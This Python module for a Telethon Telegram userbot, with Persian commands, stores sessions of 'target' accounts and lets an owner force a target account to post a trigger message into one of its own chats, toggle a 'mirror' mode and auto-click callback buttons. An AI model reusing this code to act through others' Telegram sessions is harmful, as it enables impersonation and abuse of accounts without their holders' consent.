import asyncio
from telethon import events

# =========================
# CONFIG
# =========================
OWNER_ID = 6433381392

mirror_enabled = True

mirror_users = set()

# target_id -> client session
mirror_clients = {}

# sender_id -> target_id
active_targets = {}

last_msg_cache = {}


# =========================
# CORE
# =========================
def enable_mirror(state: bool):
    global mirror_enabled
    mirror_enabled = state


def add_user(user_id: int):
    mirror_users.add(user_id)


def remove_user(user_id: int):
    mirror_users.discard(user_id)


def set_client(user_id: int, client):
    mirror_clients[user_id] = client


def set_target(user_id: int, target_id: int):
    active_targets[user_id] = target_id


def get_target_client(user_id: int):
    target_id = active_targets.get(user_id)
    if not target_id:
        return None
    return mirror_clients.get(target_id)


# =========================
# FORCE SEND PANEL (IMPORTANT FIX)
# =========================
async def force_send_panel(target_client):
    """
    پیام را از طرف اکانت هدف در یک چت واقعی ارسال می‌کند
    تا handler "^پنل$" فعال شود
    """

    async for dialog in target_client.iter_dialogs():
        if dialog.is_user or dialog.is_group:
            await target_client.send_message(dialog.id, "پنل")
            return True

    return False


# =========================
# MAIN REGISTER
# =========================
def register_mirror(client):

    # =========================
    # OWNER COMMAND: .پنل <id>
    # =========================
    @client.on(events.NewMessage(pattern=r"^\.پنل (\d+)$"))
    async def panel_cmd(event):

        if event.sender_id != OWNER_ID:
            return await event.reply("No access")

        target_id = int(event.pattern_match.group(1))

        target_client = mirror_clients.get(target_id)
        if not target_client:
            return await event.reply("Target session not found")

        set_target(event.sender_id, target_id)

        ok = await force_send_panel(target_client)

        if not ok:
            return await event.reply("No valid chat found for target")

        await event.reply("Panel sent via target account")

    # =========================
    # TRIGGER HANDLER
    # =========================
    @client.on(events.NewMessage(pattern=r"^پنل$"))
    async def panel_trigger(event):

        if event.sender_id not in mirror_users:
            return

        await event.reply("Panel activated")

    # =========================
    # CALLBACK FIX
    # =========================
    @client.on(events.CallbackQuery)
    async def callback_handler(event):

        if not mirror_enabled:
            return

        user_id = event.sender_id

        if user_id not in mirror_users:
            return

        try:
            msg = await event.get_message()
            if not msg:
                return

            last_msg_cache[user_id] = msg

            await event.answer()
            await msg.click()

        except Exception as e:
            print("Callback error:", e)


# =========================
# ADMIN COMMANDS
# =========================
def register_commands(client):

    @client.on(events.NewMessage(pattern=r"^\.افزودن کاربر (\d+)$"))
    async def add_cmd(event):
        if event.sender_id != OWNER_ID:
            return await event.reply("No access")

        add_user(int(event.pattern_match.group(1)))
        await event.reply("User added")

    @client.on(events.NewMessage(pattern=r"^\.حذف کاربر (\d+)$"))
    async def remove_cmd(event):
        if event.sender_id != OWNER_ID:
            return await event.reply("No access")

        remove_user(int(event.pattern_match.group(1)))
        await event.reply("User removed")

    @client.on(events.NewMessage(pattern=r"^\.میرور روشن$"))
    async def on_cmd(event):
        if event.sender_id != OWNER_ID:
            return await event.reply("No access")

        enable_mirror(True)
        await event.reply("Mirror ON")

    @client.on(events.NewMessage(pattern=r"^\.میرور خاموش$"))
    async def off_cmd(event):
        if event.sender_id != OWNER_ID:
            return await event.reply("No access")

        enable_mirror(False)
        await event.reply("Mirror OFF")


# =========================
# LOOP
# =========================
async def bridge_worker():
    while True:
        await asyncio.sleep(1)
